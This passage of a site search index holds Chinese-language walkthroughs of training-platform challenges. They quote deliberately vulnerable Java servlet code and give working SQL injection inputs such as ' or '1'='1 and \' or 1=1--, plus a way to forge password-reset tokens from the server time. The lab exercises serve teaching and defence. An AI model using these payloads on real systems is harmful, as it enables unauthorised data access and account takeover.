\u5bf9\u4e8e\u666e\u901a\u7684\u7814\u53d1\u4eba\u5458\uff0c\u767d\u540d\u5355+\u9ed1\u540d\u5355\u7684\u65b9\u5f0f\u53ef\u80fd\u66f4\u7b80\u5355\uff0c\u6bd4\u5982\u672c\u9898\u8fdb\u4e00\u6b65\u4e0d\u5141\u8bb8\u8f93\u5165\u5355\u5f15\u53f7\u7b49\u7279\u6b8a\u5b57\u7b26","title":"SQL Injection Challenge Two(SQL\u6ce8\u5165\u6311\u6218 2)"},{"location":"vul/SQL-Injection-Challenge-Two.html#sql-injection-challenge-twosql-2","text":"","title":"SQL Injection Challenge Two(SQL\u6ce8\u5165\u6311\u6218 2)"},{"location":"vul/SQL-Injection-Challenge-Two.html#_1","text":"\u9700\u8981\u5229\u7528\u4e00\u4e2aSQL\u6ce8\u5165\u70b9\uff0c\u83b7\u5f97\u901a\u5173\u5bc6\u94a5","title":"\u9898\u4ecb\u7ecd"},{"location":"vul/SQL-Injection-Challenge-Two.html#_2","text":"\u70b9\u51fb\u67e5\u8be2\u7528\u6237,\u83b7\u5f97\u5bf9\u5e94\u8bf7\u6c42 POST /challenges/ffd39cb26727f34cbf9fce3e82b9d703404e99cdef54d2aa745f497abe070b HTTP/1.1 userIdentity=test%40qq.com%22+or+%221%22%3D%221 \u5bf9\u5e94\u4ee3\u7801\u6587\u4ef6 src/main/java/servlets/module/challenge/SqlInjectionEmail.java String userIdentity = request.getParameter(\"userIdentity\"); log.debug(\"User Submitted - \" + userIdentity); if(Validate.isValidEmailAddress(userIdentity)) { log.debug(\"Filtered to \" + userIdentity); String ApplicationRoot = getServletContext().getRealPath(\"\"); log.debug(\"Servlet root = \" + ApplicationRoot ); log.debug(\"Getting Connection to Database\"); Connection conn = Database.getChallengeConnection(ApplicationRoot, \"SqlChallengeEmail\"); Statement stmt = conn.createStatement(); log.debug(\"Gathering result set\"); ResultSet resultSet = stmt.executeQuery(\"SELECT * FROM customers WHERE customerAddress = '\" + userIdentity + \"'\"); \u83b7\u5f97 userIdentity \u53c2\u6570\u540e\uff0c\u8fdb\u884c\u4e86SQL\u67e5\u8be2\uff0c\u4f46\u4e2d\u95f4\u8c03\u7528Validate.isValidEmailAddress \u8fdb\u884c\u4e86\u4e00\u6b21\u5bf9\u53c2\u6570\u8fc7\u6ee4\uff0c\u5224\u65ad\u662f\u5426\u662f\u5408\u6cd5\u7684\u90ae\u7bb1\u5730\u5740 \uff0c\u8be6\u7ec6\u4ee3\u7801\u5982\u4e0b public static boolean isValidEmailAddress(String email) { boolean result = true; try { log.debug(\"About to crash\"); InternetAddress emailAddr = new InternetAddress(email); log.debug(\"Did we crash\"); emailAddr.validate(); log.debug(\"Didn't crash\"); } catch (AddressException ex) { result = false; } return result; } \u901a\u8fc7InternetAddress \u7c7b\u8fdb\u884c\u5224\u65ad\u7684\uff0c\u56e0\u6b64\u8981\u60f3\u6210\u529f\u6ce8\u5165\u83b7\u53d6\u7ed3\u679c\uff0c\u9996\u5148\u8981\u7ed5\u8fc7InternetAddress\u7c7b\u7684\u68c0\u6d4b\uff0c\u7ecf\u8fc7\u6d4b\u8bd5\u8be5\u7c7b\u4e0d\u5141\u8bb8\u90ae\u7bb1\u5730\u5740\u5b58\u5728\u7a7a\u683c","title":"\u529f\u80fd\u5b9e\u73b0"},{"location":"vul/SQL-Injection-Challenge-Two.html#_3","text":"\u4e0d\u80fd\u8f93\u5165\u7a7a\u683c\uff0c\u53ef\u4ee5\u4f7f\u7528\u5f88\u591a\u65b9\u6cd5\u7ed5\u8fc7\u68c0\u6d4b \u5982 test@qq.com 'or'1'='1 \uff0c\u6700\u7ec8\u6267\u884c\u7684SQL\u53d8\u6210 SELECT * FROM customers WHERE customerAddress = 'test@qq.com'or'1'='1'","title":"\u89e3\u9898\u6b65\u9aa4"},{"location":"vul/SQL-Injection-Challenge-Two.html#_4","text":"\u5728\u5f00\u53d1\u6307\u5357\u4e2d\uff0c\u6211\u4eec\u7ecf\u5e38\u8981\u6c42\u8fdb\u884c\u8f93\u5165\u9a8c\u8bc1\uff0c\u4f46\u672c\u9898\u505a\u4e86\u8f93\u5165\u9a8c\u8bc1\uff0c\u4ecd\u7136\u5b58\u5728\u5b89\u5168\u6f0f\u6d1e\uff0c\u8bf4\u660e\u80fd\u591f\u5b9e\u73b0\u6b63\u786e\u7684\u8f93\u5165\u9a8c\u8bc1\u5e76\u975e\u6613\u4e8b \u5bf9\u4e8e\u666e\u901a\u7684\u7814\u53d1\u4eba\u5458\uff0c\u767d\u540d\u5355+\u9ed1\u540d\u5355\u7684\u65b9\u5f0f\u53ef\u80fd\u66f4\u7b80\u5355\uff0c\u6bd4\u5982\u672c\u9898\u8fdb\u4e00\u6b65\u4e0d\u5141\u8bb8\u8f93\u5165\u5355\u5f15\u53f7\u7b49\u7279\u6b8a\u5b57\u7b26","title":"\u603b\u7ed3"},{"location":"vul/SQL-Injection-Escaping-Challenge.html","text":"SQL Injection Escaping Challenge(SQL \u6ce8\u5165\u8f6c\u4e49) \u00b6 \u9898\u4ecb\u7ecd \u00b6 \u9700\u8981\u5229\u7528SQL\u6ce8\u5165\u70b9\u83b7\u5f97\u672c\u9898\u7684\u901a\u5173\u5bc6\u94a5\uff0c\u901a\u8fc7\u9898\u7684\u4ecb\u7ecd\uff0c\u77e5\u9053\u5355\u5f15\u53f7\u5df2\u7ecf\u88ab\u8f6c\u4e49\u4e86 \u529f\u80fd\u5b9e\u73b0 \u00b6 \u83b7\u5f97\u8bf7\u6c42\u6570\u636e\u5305 POST /challenges/8c3c35c30cdbbb73b7be3a4f8587aa9d88044dc43e248984a252c6e861f673d4 HTTP/1.1 aUserId=%22+or+%221%22%3D%221 \u5bf9\u5e94\u5b9e\u73b0\u7684\u4ee3\u7801 \u5728 src/main/java/servlets/module/challenge/SqlInjectionEscaping.java String aUserId = request.getParameter(\"aUserId\"); log.debug(\"User Submitted - \" + aUserId); aUserId = aUserId.replaceAll(\"'\", \"\\\\\\\\'\"); //Replace ' with \\' log.debug(\"Escaped to - \" + aUserId); String ApplicationRoot = getServletContext().getRealPath(\"\"); log.debug(\"Getting Connection to Database\"); Connection conn = Database.getChallengeConnection(ApplicationRoot, \"SqlChallengeEscape\"); Statement stmt = conn.createStatement(); log.debug(\"Gathering result set\"); ResultSet resultSet = stmt.executeQuery(\"SELECT * FROM customers WHERE customerId = '\" + aUserId + \"'\"); \u53ef\u89c1\u5355\u5f15\u53f7\u88ab\u8f6c\u4e49\u6210\\', \u63a5\u4e0b\u6765\u662f\u4e00\u4e2a\u6bd4\u8f83\u5178\u578b\u7684\u5b57\u7b26\u578bSQL\u6ce8\u5165\u9700\u8981\u7528\u5230\u5355\u5f15\u53f7 \u89e3\u9898\u6b65\u9aa4 \u00b6 \u672c\u9898\u662f\u7814\u53d1\u81ea\u5df1\u5b9e\u73b0\u7684\u5b89\u5168\u8fc7\u6ee4\uff0c\u5b58\u5728\u8003\u8651\u4e0d\u5468\uff0c\u5982\u679c\u7528\u6237\u8f93\u5165 \\' \u5219\u53d8\u6210 \\' \u4f7f\u5f97\\\u5931\u53bb\u4e86\u8f6c\u4e49\u4f5c\u7528\uff0c\u76f4\u63a5\u8f93\u5165 \\' or 1=1-- \u5373\u53ef \u603b\u7ed3 \u00b6 \u7814\u53d1\u4eba\u5458\u7b2c\u4e00\u6b65\u9700\u8981\u6811\u7acb\u5b89\u5168\u610f\u8bc6\uff0c\u5bf9\u7528\u6237\u63d0\u4ea4\u7684\u53c2\u6570\u8fdb\u884c\u8f93\u5165\u68c0\u67e5\uff0c\u5f53\u7814\u53d1\u4eba\u5458\u5f62\u6210\u610f\u8bc6\u540e\uff0c\u53d1\u73b0\u5176\u5b9e\u662f\u8fdb\u5165\u4e86\u4e00\u4e2a\u5b89\u5168\u5bf9\u6297\u9886\u57df\uff0c\u9700\u8981\u4e0d\u65ad\u63d0\u9ad8\u81ea\u8eab\u8fc7\u6ee4\u80fd\u529b\uff0c\u624d\u80fd\u5b8c\u5168\u6d88\u706d\u5b89\u5168\u6f0f\u6d1e \u6700\u7406\u60f3\u7684\u60c5\u51b5\uff0c\u975e\u4e0d\u5f97\u5df2\u4e0d\u8981\u81ea\u5df1\u7f16\u5199\u590d\u6742\u7684\u8fc7\u6ee4\u6821\u9a8c\uff0c\u53ef\u4ee5\u4f7f\u7528\u516c\u5f00\u7684\u516c\u8ba4\u5b89\u5168\u7684\u8fc7\u6ee4\u5e93","title":"SQL Injection Escaping Challenge(SQL \u6ce8\u5165\u8f6c\u4e49)"},{"location":"vul/SQL-Injection-Escaping-Challenge.html#sql-injection-escaping-challengesql","text":"","title":"SQL Injection Escaping Challenge(SQL \u6ce8\u5165\u8f6c\u4e49)"},{"location":"vul/SQL-Injection-Escaping-Challenge.html#_1","text":"\u9700\u8981\u5229\u7528SQL\u6ce8\u5165\u70b9\u83b7\u5f97\u672c\u9898\u7684\u901a\u5173\u5bc6\u94a5\uff0c\u901a\u8fc7\u9898\u7684\u4ecb\u7ecd\uff0c\u77e5\u9053\u5355\u5f15\u53f7\u5df2\u7ecf\u88ab\u8f6c\u4e49\u4e86","title":"\u9898\u4ecb\u7ecd"},{"location":"vul/SQL-Injection-Escaping-Challenge.html#_2","text":"\u83b7\u5f97\u8bf7\u6c42\u6570\u636e\u5305 POST /challenges/8c3c35c30cdbbb73b7be3a4f8587aa9d88044dc43e248984a252c6e861f673d4 HTTP/1.1 aUserId=%22+or+%221%22%3D%221 \u5bf9\u5e94\u5b9e\u73b0\u7684\u4ee3\u7801 \u5728 src/main/java/servlets/module/challenge/SqlInjectionEscaping.java String aUserId = request.getParameter(\"aUserId\"); log.debug(\"User Submitted - \" + aUserId); aUserId = aUserId.replaceAll(\"'\", \"\\\\\\\\'\"); //Replace ' with \\' log.debug(\"Escaped to - \" + aUserId); String ApplicationRoot = getServletContext().getRealPath(\"\"); log.debug(\"Getting Connection to Database\"); Connection conn = Database.getChallengeConnection(ApplicationRoot, \"SqlChallengeEscape\"); Statement stmt = conn.createStatement(); log.debug(\"Gathering result set\"); ResultSet resultSet = stmt.executeQuery(\"SELECT * FROM customers WHERE customerId = '\" + aUserId + \"'\"); \u53ef\u89c1\u5355\u5f15\u53f7\u88ab\u8f6c\u4e49\u6210\\', \u63a5\u4e0b\u6765\u662f\u4e00\u4e2a\u6bd4\u8f83\u5178\u578b\u7684\u5b57\u7b26\u578bSQL\u6ce8\u5165\u9700\u8981\u7528\u5230\u5355\u5f15\u53f7","title":"\u529f\u80fd\u5b9e\u73b0"},{"location":"vul/SQL-Injection-Escaping-Challenge.html#_3","text":"\u672c\u9898\u662f\u7814\u53d1\u81ea\u5df1\u5b9e\u73b0\u7684\u5b89\u5168\u8fc7\u6ee4\uff0c\u5b58\u5728\u8003\u8651\u4e0d\u5468\uff0c\u5982\u679c\u7528\u6237\u8f93\u5165 \\' \u5219\u53d8\u6210 \\' \u4f7f\u5f97\\\u5931\u53bb\u4e86\u8f6c\u4e49\u4f5c\u7528\uff0c\u76f4\u63a5\u8f93\u5165 \\' or 1=1-- \u5373\u53ef","title":"\u89e3\u9898\u6b65\u9aa4"},{"location":"vul/SQL-Injection-Escaping-Challenge.html#_4","text":"\u7814\u53d1\u4eba\u5458\u7b2c\u4e00\u6b65\u9700\u8981\u6811\u7acb\u5b89\u5168\u610f\u8bc6\uff0c\u5bf9\u7528\u6237\u63d0\u4ea4\u7684\u53c2\u6570\u8fdb\u884c\u8f93\u5165\u68c0\u67e5\uff0c\u5f53\u7814\u53d1\u4eba\u5458\u5f62\u6210\u610f\u8bc6\u540e\uff0c\u53d1\u73b0\u5176\u5b9e\u662f\u8fdb\u5165\u4e86\u4e00\u4e2a\u5b89\u5168\u5bf9\u6297\u9886\u57df\uff0c\u9700\u8981\u4e0d\u65ad\u63d0\u9ad8\u81ea\u8eab\u8fc7\u6ee4\u80fd\u529b\uff0c\u624d\u80fd\u5b8c\u5168\u6d88\u706d\u5b89\u5168\u6f0f\u6d1e \u6700\u7406\u60f3\u7684\u60c5\u51b5\uff0c\u975e\u4e0d\u5f97\u5df2\u4e0d\u8981\u81ea\u5df1\u7f16\u5199\u590d\u6742\u7684\u8fc7\u6ee4\u6821\u9a8c\uff0c\u53ef\u4ee5\u4f7f\u7528\u516c\u5f00\u7684\u516c\u8ba4\u5b89\u5168\u7684\u8fc7\u6ee4\u5e93","title":"\u603b\u7ed3"},{"location":"vul/SQL-Injection-Lesson.html","text":"SQL Injection Lesson(SQL \u6ce8\u5165) \u00b6 \u9898\u4ecb\u7ecd \u00b6 \u5728\u9875\u9762\u8f93\u5165\u6846\u4e2d\u8f93\u5165\u4fe1\u606f\uff0c\u5c06\u6570\u636e\u8868\u6240\u6709\u4fe1\u606f\u67e5\u8be2\u51fa\u6765 \u529f\u80fd\u5b9e\u73b0 \u00b6 \u70b9\u51fb\u9875\u9762 \u83b7\u53d6\u8be5\u7528\u6237 \u6309\u94ae POST /lessons/e881086d4d8eb2604d8093d93ae60986af8119c4f643894775433dbfb6faa594 HTTP/1.1 aUserName='+or+'1'%3D'1 \u5bf9\u5e94\u540e\u7aef\u4ee3\u7801 src/main/java/servlets/module/lesson/SqlInjectionLesson.java String aUserName = request.getParameter(\"aUserName\"); log.debug(\"User Submitted - \" + aUserName); String ApplicationRoot = getServletContext().getRealPath(\"\"); log.debug(\"Servlet root = \" + ApplicationRoot ); String[][] output = getSqlInjectionResult(ApplicationRoot, aUserName); \u5177\u4f53\u6267\u884c\u7684SQL public static String[][] getSqlInjectionResult (String ApplicationRoot, String username) { String[][] result = new String[10][3]; try { Connection conn = Database.getSqlInjLessonConnection(ApplicationRoot); Statement stmt; stmt = conn.createStatement(); ResultSet resultSet = stmt.executeQuery(\"SELECT * FROM tb_users WHERE username = '\" + username + \"'\"); \u6ca1\u6709\u5bf9\u63d0\u4ea4\u7684\u53c2\u6570\u8fdb\u884c\u4efb\u4f55\u64cd\u4f5c\uff0c\u76f4\u63a5\u62fc\u63a5\u6210SQL\u8bed\u53e5\uff0c\u8fdb\u884c\u67e5\u8be2 \u89e3\u9898\u6b65\u9aa4 \u00b6 \u76f4\u63a5\u5728\u754c\u9762\u8f93\u5165 ' or '1'='1 \u6700\u7ec8\u6267\u884c\u7684SQL\u8bed\u53e5\u5982\u4e0b\uff0c\u662f\u4e00\u4e2a\u6c38\u771f\u67e5\u8be2\u6761\u4ef6 SELECT * FROM tb_users WHERE username = '' or '1'='1' \u67e5\u8be2\u5230\u6240\u6709\u4fe1\u606f \u603b\u7ed3 \u00b6 SQL\u6ce8\u5165\u662f\u975e\u5e38\u5e38\u89c1\u7684\u4e00\u79cd\u6f0f\u6d1e,\u5bf9\u6570\u636e\u5e93\u8fdb\u884c\u64cd\u4f5c\u65f6\uff0c\u672a\u8003\u8651\u5b89\u5168\u6027\uff0c\u5bfc\u81f4\u7528\u6237\u8f93\u5165\u7684\u6570\u636e\u5f53\u4f5cSQL\u6307\u4ee4\u8fdb\u884c\u6267\u884c\uff0c\u8fdb\u800c\u653b\u51fb\u8005\u5b8c\u5168\u63a7\u5236\u4e86\u4e00\u6761SQL\u8bed\u53e5,\u80fd\u591f\u505a\u5f88\u591a\u610f\u60f3\u4e0d\u5230\u7684\u4e8b\u60c5 \u9488\u5bf9\u5173\u7cfb\u578b\u6570\u636e\u5e93\u7684\u6ce8\u5165\uff0c\u4e00\u822c\u901a\u7528\u7684\u89e3\u51b3\u65b9\u6848\u662f\u53c2\u6570\u5316\u67e5\u8be2\u6216\u8005\u53eb\u9884\u7f16\u8bd1\u67e5\u8be2\uff0c\u7b80\u5355\u8bf4 \u5c31\u662f\u4fdd\u8bc1\u7528\u6237\u8f93\u5165\u7684\u6570\u636e\u53ea\u5f53\u6210\u6570\u636e\uff0c\u4e0d\u4f1a\u53d8\u6210SQL\u6307\u4ee4","title":"SQL Injection Lesson(SQL \u6ce8\u5165)"},{"location":"vul/SQL-Injection-Lesson.html#sql-injection-lessonsql","text":"","title":"SQL Injection Lesson(SQL \u6ce8\u5165)"},{"location":"vul/SQL-Injection-Lesson.html#_1","text":"\u5728\u9875\u9762\u8f93\u5165\u6846\u4e2d\u8f93\u5165\u4fe1\u606f\uff0c\u5c06\u6570\u636e\u8868\u6240\u6709\u4fe1\u606f\u67e5\u8be2\u51fa\u6765","title":"\u9898\u4ecb\u7ecd"},{"location":"vul/SQL-Injection-Lesson.html#_2","text":"\u70b9\u51fb\u9875\u9762 \u83b7\u53d6\u8be5\u7528\u6237 \u6309\u94ae POST /lessons/e881086d4d8eb2604d8093d93ae60986af8119c4f643894775433dbfb6faa594 HTTP/1.1 aUserName='+or+'1'%3D'1 \u5bf9\u5e94\u540e\u7aef\u4ee3\u7801 src/main/java/servlets/module/lesson/SqlInjectionLesson.java String aUserName = request.getParameter(\"aUserName\"); log.debug(\"User Submitted - \" + aUserName); String ApplicationRoot = getServletContext().getRealPath(\"\"); log.debug(\"Servlet root = \" + ApplicationRoot ); String[][] output = getSqlInjectionResult(ApplicationRoot, aUserName); \u5177\u4f53\u6267\u884c\u7684SQL public static String[][] getSqlInjectionResult (String ApplicationRoot, String username) { String[][] result = new String[10][3]; try { Connection conn = Database.getSqlInjLessonConnection(ApplicationRoot); Statement stmt; stmt = conn.createStatement(); ResultSet resultSet = stmt.executeQuery(\"SELECT * FROM tb_users WHERE username = '\" + username + \"'\"); \u6ca1\u6709\u5bf9\u63d0\u4ea4\u7684\u53c2\u6570\u8fdb\u884c\u4efb\u4f55\u64cd\u4f5c\uff0c\u76f4\u63a5\u62fc\u63a5\u6210SQL\u8bed\u53e5\uff0c\u8fdb\u884c\u67e5\u8be2","title":"\u529f\u80fd\u5b9e\u73b0"},{"location":"vul/SQL-Injection-Lesson.html#_3","text":"\u76f4\u63a5\u5728\u754c\u9762\u8f93\u5165 ' or '1'='1 \u6700\u7ec8\u6267\u884c\u7684SQL\u8bed\u53e5\u5982\u4e0b\uff0c\u662f\u4e00\u4e2a\u6c38\u771f\u67e5\u8be2\u6761\u4ef6 SELECT * FROM tb_users WHERE username = '' or '1'='1' \u67e5\u8be2\u5230\u6240\u6709\u4fe1\u606f","title":"\u89e3\u9898\u6b65\u9aa4"},{"location":"vul/SQL-Injection-Lesson.html#_4","text":"SQL\u6ce8\u5165\u662f\u975e\u5e38\u5e38\u89c1\u7684\u4e00\u79cd\u6f0f\u6d1e,\u5bf9\u6570\u636e\u5e93\u8fdb\u884c\u64cd\u4f5c\u65f6\uff0c\u672a\u8003\u8651\u5b89\u5168\u6027\uff0c\u5bfc\u81f4\u7528\u6237\u8f93\u5165\u7684\u6570\u636e\u5f53\u4f5cSQL\u6307\u4ee4\u8fdb\u884c\u6267\u884c\uff0c\u8fdb\u800c\u653b\u51fb\u8005\u5b8c\u5168\u63a7\u5236\u4e86\u4e00\u6761SQL\u8bed\u53e5,\u80fd\u591f\u505a\u5f88\u591a\u610f\u60f3\u4e0d\u5230\u7684\u4e8b\u60c5 \u9488\u5bf9\u5173\u7cfb\u578b\u6570\u636e\u5e93\u7684\u6ce8\u5165\uff0c\u4e00\u822c\u901a\u7528\u7684\u89e3\u51b3\u65b9\u6848\u662f\u53c2\u6570\u5316\u67e5\u8be2\u6216\u8005\u53eb\u9884\u7f16\u8bd1\u67e5\u8be2\uff0c\u7b80\u5355\u8bf4 \u5c31\u662f\u4fdd\u8bc1\u7528\u6237\u8f93\u5165\u7684\u6570\u636e\u53ea\u5f53\u6210\u6570\u636e\uff0c\u4e0d\u4f1a\u53d8\u6210SQL\u6307\u4ee4","title":"\u603b\u7ed3"},{"location":"vul/SQL-Injection-Stored-Procedure-Challenge.html","text":"SQL Injection Stored Procedure Challenge(SQL \u6ce8\u5165\u50a8\u5b58\u7a0b\u5e8f) \u00b6 \u9898\u4ecb\u7ecd \u00b6 \u901a\u8fc7\u6ce8\u5165\u70b9\u83b7\u5f97\u901a\u5173\u5bc6\u94a5 \u529f\u80fd\u5b9e\u73b0 \u00b6 \u8bf7\u6c42\u6570\u636e\u5305 POST /challenges/7edcbc1418f11347167dabb69fcb54137960405da2f7a90a0684f86c4d45a2e7 HTTP/1.1 userIdentity=test \u89e3\u9898\u6b65\u9aa4 \u00b6 \u603b\u7ed3 \u00b6","title":"SQL Injection Stored Procedure Challenge(SQL \u6ce8\u5165\u50a8\u5b58\u7a0b\u5e8f)"},{"location":"vul/SQL-Injection-Stored-Procedure-Challenge.html#sql-injection-stored-procedure-challengesql","text":"","title":"SQL Injection Stored Procedure Challenge(SQL \u6ce8\u5165\u50a8\u5b58\u7a0b\u5e8f)"},{"location":"vul/SQL-Injection-Stored-Procedure-Challenge.html#_1","text":"\u901a\u8fc7\u6ce8\u5165\u70b9\u83b7\u5f97\u901a\u5173\u5bc6\u94a5","title":"\u9898\u4ecb\u7ecd"},{"location":"vul/SQL-Injection-Stored-Procedure-Challenge.html#_2","text":"\u8bf7\u6c42\u6570\u636e\u5305 POST /challenges/7edcbc1418f11347167dabb69fcb54137960405da2f7a90a0684f86c4d45a2e7 HTTP/1.1 userIdentity=test","title":"\u529f\u80fd\u5b9e\u73b0"},{"location":"vul/SQL-Injection-Stored-Procedure-Challenge.html#_3","text":"","title":"\u89e3\u9898\u6b65\u9aa4"},{"location":"vul/SQL-Injection-Stored-Procedure-Challenge.html#_4","text":"","title":"\u603b\u7ed3"},{"location":"vul/Session-Management-Challenge-Five.html","text":"Session Management Challenge Five(\u4f1a\u8bdd\u7ba1\u7406 5) \u00b6 \u9898\u4ecb\u7ecd \u00b6 \u9700\u8981\u8f93\u5165\u8d26\u53f7\u548c\u5bc6\u7801\u8fdb\u884c\u767b\u5f55 \u529f\u80fd\u5b9e\u73b0 \u00b6 \u8bf7\u6c42\u6570\u636e\u5305 POST /challenges/7aed58f3a00087d56c844ed9474c671f8999680556c127a19ee79fa5d7a132e1 HTTP/1.1 subUserName=test&subUserPassword=password \u5bf9\u5e94\u4ee3\u7801\u5b9e\u73b0 Object nameObj = request.getParameter(\"subUserName\"); Object passObj = request.getParameter(\"subUserPassword\"); String subName = new String(); String subPass = new String(); String userAddress = new String(); if(nameObj != null) subName = (String) nameObj; if(passObj != null) subPass = (String) passObj; log.debug(\"subName = \" + subName); log.debug(\"subPass = \" + subPass); log.debug(\"Getting ApplicationRoot\"); String ApplicationRoot = getServletContext().getRealPath(\"\"); log.debug(\"Servlet root = \" + ApplicationRoot ); Connection conn = Database.getChallengeConnection(ApplicationRoot, \"BrokenAuthAndSessMangChalFive\"); log.debug(\"Checking credentials\"); PreparedStatement callstmt; log.debug(\"Committing changes made to database\"); callstmt = conn.prepareStatement(\"COMMIT\"); callstmt.execute(); log.debug(\"Changes committed.\"); callstmt = conn.prepareStatement(\"SELECT userName, userRole FROM users WHERE userName = ?\"); //\u53c2\u6570\u5316\u67e5\u8be2 \u662f\u5426\u5b58\u5728\u7528\u6237 callstmt.setString(1, subName); log.debug(\"Executing findUser\"); ResultSet resultSet = callstmt.executeQuery(); //Is the username valid? if(resultSet.next()) { log.debug(\"User found\"); //Is the user an Admin? if(resultSet.getString(2).equalsIgnoreCase(\"admin\")) //\u5224\u65ad\u7528\u6237\u662f\u5426\u662f\u7ba1\u7406\u5458 { log.debug(\"Admin Detected\"); callstmt = conn.prepareStatement(\"SELECT userName, userRole FROM users WHERE userName = ? AND userPassword = SHA(?)\"); //\u5224\u65ad\u7528\u6237\u540d\u548c\u5bc6\u7801\u662f\u5426\u6b63\u786e callstmt.setString(1, subName); callstmt.setString(2, subPass); \u53d1\u73b0\u6ca1\u6709SQL\u6ce8\u5165\u95ee\u9898 \u627e\u56de\u5bc6\u7801\u529f\u80fd\u4ee3\u7801 POST /challenges/7aed58f3a00087d56c844ed9474c671f8999680556c127a19ee79fa5d7a132e1SendToken HTTP/1.1 subUserName=admin \u5bf9\u5e94\u5b9e\u73b0 Object nameObj = request.getParameter(\"subUserName\"); String userName = new String(); if(nameObj != null) userName = (String) nameObj; log.debug(\"subName = \" + userName); log.debug(\"Getting ApplicationRoot\"); String ApplicationRoot = getServletContext().getRealPath(\"\"); log.debug(\"Servlet root = \" + ApplicationRoot ); Connection conn = Database.getChallengeConnection(ApplicationRoot, \"BrokenAuthAndSessMangChalFive\"); log.debug(\"Checking name\"); PreparedStatement callstmt; log.debug(\"Committing changes made to database\"); callstmt = conn.prepareStatement(\"COMMIT\"); callstmt.execute(); log.debug(\"Changes committed.\"); callstmt = conn.prepareStatement(\"SELECT userName FROM users WHERE userName = ?\"); //\u53c2\u6570\u5316\u67e5\u8be2 callstmt.setString(1, userName); log.debug(\"Executing findUser\"); ResultSet resultSet = callstmt.executeQuery(); //Is the username valid? if(resultSet.next()) { log.debug(\"User found\"); //\u53ef\u4ee5\u5224\u65ad\u7528\u6237\u540d\u662f\u5426\u5b58\u5728 htmlOutput = bundle.getString(\"setToken.sentTo.1\") + \" '\" + Encode.forHtml(userName) + \"' \" + bundle.getString(\"setToken.sentTo.2\"); } else \u53ea\u80fd\u5224\u65ad\u7528\u6237\u540d\u662f\u5426\u5b58\u5728 \u4ece\u9875\u9762html\u4e2d\u53ef\u4ee5\u627e\u5230\u91cd\u7f6e\u7528\u6237\u540d\u548c\u5bc6\u7801\u7684\u94fe\u63a5 POST /challenges/7aed58f3a00087d56c844ed9474c671f8999680556c127a19ee79fa5d7a132e1ChangePass HTTP/1.1 userName=admin&newPassword=password&resetPasswordToken=U3RhIFNlcCAxOCAwODoyODoxMCBCU1QgMjAyMQ== \u524d\u4e24\u4e2a\u53c2\u6570\u6bd4\u8f83\u597d\u7406\u89e3\uff0c\u6700\u540e\u4e00\u4e2a\u53c2\u6570\uff0c\u9ed1\u76d2\u662f\u975e\u5e38\u96be\u60f3\u5230\u7684 Object tokenObj = request.getParameter(\"resetPasswordToken\"); String userName = new String(); String newPass = new String(); String token = new String(); if(passNewObj != null) newPass = (String) passNewObj; if(userNewObj != null) userName = (String) userNewObj; if(tokenObj != null) token = (String) tokenObj; log.debug(\"userName = \" + userName); log.debug(\"newPass = \" + newPass); log.debug(\"token = \" + token); String tokenTime = new String(); try { byte[] decodedToken = Base64.decodeBase64(token); tokenTime = new String(decodedToken, \"UTF-8\"); } catch (UnsupportedEncodingException e) { log.debug(\"Could not decode password token\"); errorMessage += \"<p>\" + bundle.getString(\"changePass.noDecode\") + \"</p>\"; } if(tokenTime.isEmpty()) { log.debug(\"Could not decode token. Ending Servlet.\"); out.write(errorMessage); } else { log.debug(\"Decoded Token = \" + tokenTime); //Get Time from Token and see if it is inside the last 10 minutes SimpleDateFormat simpleDateFormat = new SimpleDateFormat(\"EEE MMM d HH:mm:ss Z yyyy\"); //\u65f6\u95f4\u683c\u5f0f \u5fc5\u987b\u662f\u8fd9\u79cd try { Date tokenDateTime = simpleDateFormat.parse(tokenTime); Date currentDateTime = new Date(); //Get difference in minutes tokenLife = (int)((currentDateTime.getTime()/60000) - (tokenDateTime.getTime()/60000)); log.debug(\"Token life = \" + tokenLife); } catch (ParseException e) \u89e3\u9898\u6b65\u9aa4 \u00b6 \u9700\u8981\u77e5\u9053\u670d\u52a1\u5668\u5f53\u524d\u7684 EEE MMM d HH ss Z yyyy \uff0c\u7136\u540ebase64\u7f16\u7801 \u670d\u52a1\u5668\u7684\u65f6\u95f4\u53ef\u80fd\u4e0d\u662f\u5f53\u524d\u65f6\u95f4\uff0c\u6240\u4ee5\u6267\u884c date\u547d\u4ee4 \u8fdb\u884c\u67e5\u770b \u603b\u7ed3 \u00b6 \u6709\u4e9b\u95ee\u9898\u4e0d\u8fdb\u884c\u4ee3\u7801\u5ba1\u8ba1\u662f\u5f88\u96be\u53d1\u73b0\u7684,\u6240\u4ee5\u4fdd\u62a4\u597d\u81ea\u5df1\u7684\u6e90\u4ee3\u7801\u662f\u975e\u5e38\u6709\u5fc5\u8981\u7684","title":"Session Management Challenge Five(\u4f1a\u8bdd\u7ba1\u7406 5)"},{"location":"vul/Session-Management-Challenge-Five.html#session-management-challenge-five-5","text":"","title":"Session Management Challenge Five(\u4f1a\u8bdd\u7ba1\u7406 5)"},{"location":"vul/Session-Management-Challenge-Five.html#_1","text":"\u9700\u8981\u8f93\u5165\u8d26\u53f7\u548c\u5bc6\u7801\u8fdb\u884c\u767b\u5f55","title":"\u9898\u4ecb\u7ecd"},{"location":"vul/Session-Management-Challenge-Five.html#_2","text":"\u8bf7\u6c42\u6570\u636e\u5305 POST /challenges/7aed58f3a00087d56c844ed9474c671f8999680556c127a19ee79fa5d7a132e1 HTTP/1.1 subUserName=test&subUserPassword=password \u5bf9\u5e94\u4ee3\u7801\u5b9e\u73b0 Object nameObj = request.getParameter(\"subUserName\"); Object passObj = request.getParameter(\"subUserPassword\"); String subName = new String(); String subPass = new String(); String userAddress = new String(); if(nameObj != null) subName = (String) nameObj; if(passObj != null) subPass = (String) passObj; log.debug(\"subName = \" + subName); log.debug(\"subPass = \" + subPass); log.debug(\"Getting ApplicationRoot\"); String ApplicationRoot = getServletContext().getRealPath(\"\"); log.debug(\"Servlet root = \" + ApplicationRoot ); Connection conn = Database.getChallengeConnection(ApplicationRoot, \"BrokenAuthAndSessMangChalFive\"); log.debug(\"Checking credentials\"); PreparedStatement callstmt; log.debug(\"Committing changes made to database\"); callstmt = conn.prepareStatement(\"COMMIT\"); callstmt.execute(); log.debug(\"Changes committed.\"); callstmt = conn.prepareStatement(\"SELECT userName, userRole FROM users WHERE userName = ?\"); //\u53c2\u6570\u5316\u67e5\u8be2 \u662f\u5426\u5b58\u5728\u7528\u6237 callstmt.setString(1, subName); log.debug(\"Executing findUser\"); ResultSet resultSet = callstmt.executeQuery(); //Is the username valid? if(resultSet.next()) { log.debug(\"User found\"); //Is the user an Admin? if(resultSet.getString(2).equalsIgnoreCase(\"admin\")) 